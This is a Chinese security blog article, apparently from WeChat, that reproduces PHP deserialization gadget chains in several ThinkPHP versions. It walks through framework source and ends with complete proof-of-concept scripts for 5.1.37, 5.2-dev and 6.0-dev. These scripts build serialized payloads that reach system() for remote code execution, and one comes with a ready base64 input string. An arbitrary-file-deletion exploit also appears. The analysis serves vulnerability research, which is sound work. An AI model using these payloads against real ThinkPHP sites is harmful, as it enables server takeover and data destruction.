> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg2NDU3Mzc5OA==&mid=2247485865&idx=1&sn=fff7d6e7a24cae79b4aed36a5b78e240&source=41#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEOBBtUNa6mqsFzZiaj5PxQibTNk1U9PwnHBD3JPF81cXtnTM03hLibjY8A/640?wx_fmt=gif)

听说转发文章

会给你带来好运

最近 Thinkphp 几个版本都出了反序列化利用链，这里集结在一起，下面是复现文章，poc 会放在最后

01

Thinkphp5.1.37

  

===

**环境搭建**
--------

composercreate-project topthink/think=5.1.37 v5.1.37

**poc 演示截图**
------------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEUGLnIwAUIqB5k0t210MlClytdceibcgR3H3tSNCSgqWPDo4licgvaHNA/640?wx_fmt=png)

**调用链**
-------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEVqL0NlicP5PrseGk1ib6g1rWvSiaxazWJ8ibsGp7R920Z0QZhgJWye8ibYw/640?wx_fmt=png)

**单步调试**
--------

漏洞起点在 \ thinkphp\library\think\process\pipes\windows.php 的__destruct 魔法函数。

```
public function __destruct()
{
  $this->close();
  $this->removeFiles();
}
```

```
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```

这里同时也存在一个任意文件删除的漏洞，exp 如下

```
<?php
namespace think\process\pipes;
class Pipes{
}

class Windows extends Pipes
{
    private $files = [];

    public function __construct()
{
        $this->files=['C:\FakeD\Software\phpstudy\PHPTutorial\WWW\shell.php'];
    }
}

echo base64_encode(serialize(new Windows()));
```

这里 $filename 会被当做字符串处理，而__toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发__toString 方法。

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEKQj5ePzU9eM2CxpQvL9Tz2zYVb3aY1TmNy3kOvjYbvIR1SIBl0xbLQ/640?wx_fmt=png)

```
//thinkphp\library\think\model\concern\Conversion.php
public function __toString()
{
    return $this->toJson();
}
```

```
//thinkphp\library\think\model\concern\Conversion.php
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}
```

```
//thinkphp\library\think\model\concern\Conversion.php
public function toArray()
{
    $item       = [];
    $hasVisible = false;
    ...
    if (!empty($this->append)) {
  foreach ($this->append as $key => $name) {
    if (is_array($name)) {
      // 追加关联对象属性
      $relation = $this->getRelation($key);

      if (!$relation) {
        $relation = $this->getAttr($key);
        if ($relation) {
          $relation->visible($name);
        }
      }
  ...
}
```

```
//thinkphp\library\think\model\concern\Attribute.php
public function getAttr($name, &$item = null)
{
    try {
        $notFound = false;
        $value    = $this->getData($name);
    } catch (InvalidArgumentException $e) {
        $notFound = true;
        $value    = null;
    }
    。。。
  return $value;
}
```

```
//thinkphp\library\think\model\concern\Attribute.php
public function getData($name = null)
{
  if (is_null($name)) {
    return $this->data;
  } elseif (array_key_exists($name, $this->data)) {
    return $this->data[$name];
  } elseif (array_key_exists($name, $this->relation)) {
    return $this->relation[$name];
  }
  throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
}
```

这里的 this->append 是我们可控的，然后通过 getRelation(key)，但是下面有一个!relation, 所以我们只要置空即可，然后调用 getAttr(key), 再调用 getData(name) 函数，这里 this->data['name'] 我们可控，之后回到 toArray 函数，通过这一句话 relation->visible(name); 我们控制 $relation 为一个类对象，调用不存在的 visible 方法，会自动调用__call 方法，那么我们找到一个类对象没有 visible 方法，但存在__call 方法的类，这里  

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEiadvicSHQ7m6NBkFDtZSFKY1MHHh8bZ5cWaeOlP7TPyicK1labxhPOHJg/640?wx_fmt=png)

可以看到这里有一个我们熟悉的回调函数 call_user_func_array，但是这里有一个卡住了，就是 array_unshift，这个函数把 request 对象插入到数组的开头，虽然这里的 this->hook[method] 我们可以控制，但是构造不出来参数可用的 payload，因为第一个参数是 this 对象。

目前我们所能控制的内容就是

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEE4LEr5DFkibuwK0W0L3vAkcIsT1TozONnHsIYKwEJRI8rxA9WTsVm3w/640?wx_fmt=png)

也就是我们能调用任意类的任意方法。

下面我们需要找到我们想要调用的方法，参考我之前分析的 thinkphp-RCE 的文章 thinkphp-RCE 漏洞分析, 最终产生 rce 的地方是在 input 函数当中，那我们这里可否直接调用 input 方法呢，刚刚上面已经说了，参数已经固定死是 request 类，那我们需要寻找不受这个参数影响的方法。这里采用回溯的方法

```
public function input($data = [], $name = '', $default = null, $filter = '')
{
  if (false === $name) {
    // 获取原始数据
    return $data;
  }

  $name = (string) $name;
  if ('' != $name) {
    // 解析name
    if (strpos($name, '/')) {
      list($name, $type) = explode('/', $name);
    }

    $data = $this->getData($data, $name);

    if (is_null($data)) {
      return $default;
    }

    if (is_object($data)) {
      return $data;
    }
  }

  // 解析过滤器
  $filter = $this->getFilter($filter, $default);

  if (is_array($data)) {
    array_walk_recursive($data, [$this, 'filterValue'], $filter);
    if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
            }
     } else {
        $this->filterValue($data, $name, $filter);
     }
     。。。
```

```
protected function getFilter($filter, $default)
{
  if (is_null($filter)) {
    $filter = [];
  } else {
    $filter = $filter ?: $this->filter;
    if (is_string($filter) && false === strpos($filter, '/')) {
      $filter = explode(',', $filter);
    } else {
      $filter = (array) $filter;
    }
  }

  $filter[] = $default;

  return $filter;
}
```

```
protected function getData(array $data, $name)
{
  foreach (explode('.', $name) as $val) {
    if (isset($data[$val])) {
      $data = $data[$val];
    } else {
      return;
    }
  }

  return $data;
}
```

这里 filter 可控，data 参数不可控，而且 name= (string)name; 这里如果直接调用 input 的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制 name 变量，使之最好是字符串。同时也要找到能控制 data 参数  

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUE6jmiaftrHa1xHklGJhzjnQoNMHqQhQBv6y1Zjk9PJ0whDsMyzUKNWSQ/640?wx_fmt=png)

```
public function param($name = '', $default = null, $filter = '')
{
  if (!$this->mergeParam) {
    $method = $this->method(true);

    // 自动获取请求变量
    switch ($method) {
      case 'POST':
        $vars = $this->post(false);
        break;
      case 'PUT':
      case 'DELETE':
      case 'PATCH':
        $vars = $this->put(false);
        break;
      default:
        $vars = [];
    }

    // 当前请求参数和URL地址中的参数合并
    $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

    $this->mergeParam = true;
  }

  if (true === $name) {
    // 获取包含文件上传信息的数组
    $file = $this->file();
    $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

    return $this->input($data, '', $default, $filter);
  }

  return $this->input($this->param, $name, $default, $filter);
}
```

```
array_merge($this->param, $this->get(false), $vars, $this->route(false));
```

```
public function get($name = '', $default = null, $filter = '')
{
  if (empty($this->get)) {
    $this->get = $_GET;
  }

  return $this->input($this->get, $name, $default, $filter);
}
```

```
public function route($name = '', $default = null, $filter = '')
{
    return $this->input($this->route, $name, $default, $filter);
}
```

```
public function input($data = [], $name = '', $default = null, $filter = '')
{
  if (false === $name) {
    // 获取原始数据
    return $data;
  }
   ...
}
```

可以看到这里 this->param 完全可控，是通过 get 传参数进去的，那么也就是说 input 函数中的 data 参数可控，也就是 call_user_func 的 value, 现在差一个条件，那就是 name 是字符串，继续回溯。

```
public function isAjax($ajax = false)
{
  $value  = $this->server('HTTP_X_REQUESTED_WITH');
  $result = 'xmlhttprequest' == strtolower($value) ? true : false;

  if (true === $ajax) {
    return $result;
  }

  $result           = $this->param($this->config['var_ajax']) ? true : $result;
  $this->mergeParam = false;
  return $result;
}
```

可以看到这里 $this->config['var_ajax'] 可控，那么也就是 name 可控，所有条件聚齐。成功导致 rce。

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUERuAjAEz327qb0Q6XSVWv8lfDGODgqL21AklOrZMr74Nzu6kOUFgNUQ/640?wx_fmt=png)

补充：

```
<?php

function filterValue(&$value,$key,$filters){
    if (is_callable($filters)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filters, $value);
            }
    return $value;
}

$data = array('input'=>"asdfasdf",'id'=>'whoami');
array_walk_recursive($data, "filterValue", "system");
```

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEQazTgr7CQTcSewtIsGpF894GDZ6mZknnAb3AtmEqYhiau7WPjoKUQPA/640?wx_fmt=png)

02

Thinkphp5.2.*-dev

  

===

**环境搭建**
--------

composercreate-project topthink/think=5.2.*-dev v5.2

**poc 演示截图**
------------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUELLNSc8m9HlnklX0IB8ZajXaMWsBGPd403julMvXPXYVmXzX2fMMggA/640?wx_fmt=png)

**调用链**
-------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUENTRThRyqTqqtibsBGAeb8YzwDb6zCyJIj5IPGxw7HDZ2Ybc6z2sh6Hg/640?wx_fmt=png)

**单步调试**
--------

可以看到前面的链跟 tp5.1.x 的一样，这里不在列举，直接进去 toArray 函数，可以看到 $data 可控

```
public function toArray(): array
{
  。。。
  $data = array_merge($this->data, $this->relation);

  foreach ($data as $key => $val) {
    if ($val instanceof Model || $val instanceof ModelCollection) {
      // 关联模型对象
      if (isset($this->visible[$key])) {
        $val->visible($this->visible[$key]);
      } elseif (isset($this->hidden[$key])) {
        $val->hidden($this->hidden[$key]);
      }
      // 关联模型对象
      $item[$key] = $val->toArray();
    } elseif (isset($this->visible[$key])) {
      $item[$key] = $this->getAttr($key);
    } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
      $item[$key] = $this->getAttr($key);
    }
  }
  。。。
```

```
public function getAttr(string $name)
{
        try {
            $relation = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $relation = true;
            $value    = null;
        }

        return $this->getValue($name, $value, $relation);
    }
```

```
public function getData(string $name = null)
{
        if (is_null($name)) {
            return $this->data;
        }

        $fieldName = $this->getRealFieldName($name);

        if (array_key_exists($fieldName, $this->data)) {
            return $this->data[$fieldName];
            ...
         }
   }
```

```
protected function getRealFieldName(string $name): string
{
  return $this->strict ? $name : App::parseName($name);  //this->strict默认为true
}
```

可以看到 getAttr 函数中的 value 可控，那么导致 this->getValue(name,value,relation); 这里的三个参数都可控，跟进 this->getValue(name,value,$relation);

```
protected function getValue(string $name, $value, bool $relation = false)
{
  // 检测属性获取器
  $fieldName = $this->getRealFieldName($name);
  $method    = 'get' . App::parseName($name, 1) . 'Attr';

  if (isset($this->withAttr[$fieldName])) {
    if ($relation) {
      $value = $this->getRelationValue($name);
    }

    $closure = $this->withAttr[$fieldName];
    $value   = $closure($value, $this->data);
```

这里 fieldName、this->withAttr，导致 $closure 也可控，最终直接产生 RCE。如下图

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEmnznMD1nSCVU3uvsUWN1ibjUgYOTPLVIVhgd0icibic5W0iaibZ7DXcuN1kw/640?wx_fmt=png)

补充：

```
<?php

$a = array();
system('whoami',$a);
```

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEW3lAJHUFAu64BP7cMLMcsOkk1xI10vibyVMaV0kHJm3Isu6Mnp2yP3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEzeUNhfYWg0oQiacx8ITVlmw4zAPwlep2c9SvLt1YtSUsIiaeye4eB3Lg/640?wx_fmt=png)

03

Thinkphp6.0.*-dev

  

===

**环境搭建**
--------

composercreate-project topthink/think=6.0.*-dev v6.0

**poc 演示截图**
------------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEt7ByRDlnfoupibvv9Vdr27oJa1IltR3ibo7bic9QGI2IQW4SdibX9daBCg/640?wx_fmt=png)

**调用链**
-------

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEL6JoZXVocwqa8xZKGD9XLv0amibhOM4nWibCHqfYKVNquLZFVTCzLGqQ/640?wx_fmt=png)

**单步调试**
--------

```
//vendor\topthink\think-orm\src\Model.php
public function __destruct()
{
    if ($this->lazySave) {  //$this->lazySave可控
      $this->save();
    }
}
```

```
//vendor\topthink\think-orm\src\Model.php
public function save(array $data = [], string $sequence = null): bool
{
  // 数据对象赋值
  $this->setAttrs($data);

  if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
    return false;
  }

  $result = $this->exists ? $this->updateData() : $this->insertData($sequence); //this->exists可控

  if (false === $result) {
    return false;
  }
```

```
//vendor\topthink\think-orm\src\Model.php
public function isEmpty(): bool
{
  return empty($this->data);    //可控
}
```

```
protected function trigger(string $event): bool
{
    if (!$this->withEvent) {    //可控
      return true;
  }
  ...
}
```

```
protected function updateData(): bool
{
  // 事件回调
  if (false === $this->trigger('BeforeUpdate')) {   //可控
    return false;
  }

  $this->checkData();

  // 获取有更新的数据
  $data = $this->getChangedData();  

  if (empty($data)) {      //$data可控
    // 关联更新
    if (!empty($this->relationWrite)) {
      $this->autoRelationUpdate();
    }

    return true;
  }

  if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
    // 自动写入更新时间
    $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
    $this->data[$this->updateTime] = $data[$this->updateTime];
  }

  // 检查允许字段
  $allowFields = $this->checkAllowFields();
```

```
public function getChangedData(): array
{
  $data = $this->force ? $this->data : array_udiff_assoc($this->data, $this->origin, function ($a, $b) {
    if ((empty($a) || empty($b)) && $a !== $b) {
      return 1;
    }
  //$this->force可控
    return is_object($a) || $a != $b ? 1 : 0;
  });

  // 只读字段不允许更新
  foreach ($this->readonly as $key => $field) {
    if (isset($data[$field])) {
      unset($data[$field]);
    }
  }

  return $data;
}
```

```
protected function checkAllowFields(): array
{
  // 检测字段
  if (empty($this->field)) {   //$this->field可控
    if (!empty($this->schema)) {  //$this->schema可控
      $this->field = array_keys(array_merge($this->schema, $this->jsonType));
    } else {
      $query = $this->db();
      $table = $this->table ? $this->table . $this->suffix : $query->getTable();
```

```
public function db($scope = []): Query
{
  /** @var Query $query */
  $query = self::$db->connect($this->connection)   //$this->connection可控
    ->name($this->name . $this->suffix)   //$this->suffix可控，采用拼接，调用_toString
    ->pk($this->pk);
```

后面的链跟之前的一样，这里就不分析了

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEeS8pdP2dQHDzWCLVlzicQYRRoQkzDCib1Abj3EBrZfpY4qHfbicTscovw/640?wx_fmt=png)  

04

所有 poc

  

===

**v5.1.37**
-----------

```
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["dir","calc"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}
namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
{
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
/*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/
?>
```

  

**v5.2.*-dev**
--------------

```
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
{
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("Smi1e" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("Smi1e" => "system");

        public function get($system)
{
            $this->data = array("Smi1e" => "$system");
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
{
        public function __construct($system)
{
            $this->get($system);
        }
    }
}
namespace{
  $Conver = new think\model\Pivot("whoami");
  $payload = new think\process\pipes\Windows($Conver);
  echo base64_encode(serialize($payload));
}
?>
```

‍  

**v6.0.*-dev**
--------------

```
<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 */

namespace think\model\concern {
    trait Conversion{
        protected $visible;
    }
    trait RelationShip{
        private $relation;
    }
    trait Attribute{
        private $withAttr;
        private $data;
        protected $type;
    }
    trait ModelEvent{
        protected $withEvent;
    }
}

namespace think {
    abstract class Model{
        use model\concern\RelationShip;
        use model\concern\Conversion;
        use model\concern\Attribute;
        use model\concern\ModelEvent;
        private $lazySave;
        private $exists;
        private $force;
        protected $connection;
        protected $suffix;
        function __construct($obj)
{
            if($obj == null){
                $this->data = array("wh1t3p1g"=>"whoami");
                $this->relation = array("wh1t3p1g"=>[]);
                $this->visible= array("wh1t3p1g"=>[]);
                $this->withAttr = array("wh1t3p1g"=>"system");
            }else{
                $this->lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->force = true;
                $this->data = array("wh1t3p1g"=>[]);
                $this->connection = "mysql";
                $this->suffix = $obj;
            }
        }
    }
}


namespace think\model {
    class Pivot extends \think\Model{
        function __construct($obj)
        {
            parent::__construct($obj);
        }
    }
}


namespace {
    $pivot1 = new \think\model\Pivot(null);
    $pivot2 = new \think\model\Pivot($pivot1);
    echo base64_encode(serialize($pivot2));
}
```

所有 Thinkphp 版本下载链接

https://packagist.org/packages/topthink/framework

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC7IHABFmuMlWQkSSzOMicicfBLfsdIjkOnDvssu6Znx4TTPsH8yZZNZ17hSbD95ww43fs5OFEppRTWg/640?wx_fmt=gif)

● [云众可信征稿进行时](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247484641&idx=1&sn=870601d16337054445289aa3c5b07605&scene=21#wechat_redirect)

● [原创干货 | 记一次拟真环境的模拟渗透测试](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485151&idx=1&sn=0408ac99394cb0012b228d2b189607a2&scene=21#wechat_redirect)

● [原创干货 | 从手工去除花指令到 Get Key](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485274&idx=1&sn=daf3f13277dc800eb6e869eefb7f48c0&scene=21#wechat_redirect)

● [原创干货 | 浅谈被动探测思路](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485411&idx=1&sn=d672dbc2487068bce6d5034330642c7c&scene=21#wechat_redirect)

**·END·**  
 

**云众可信**

原创 · 干货 · 一起玩

![](https://mmbiz.qpic.cn/mmbiz_jpg/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEqWOejXbVs7d9Hag8xrP17e20TDgQ0Qe72S9b8sXHk0GAdCEmnibMd4Q/640?wx_fmt=jpeg)

好看的人才能点

![](https://mmbiz.qpic.cn/mmbiz_gif/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEsDhFH0zc75xtAMC0EAtDXLPicgX6pPvk0ZHzR1uCa1KauQlicicp3piciaA/640?wx_fmt=gif)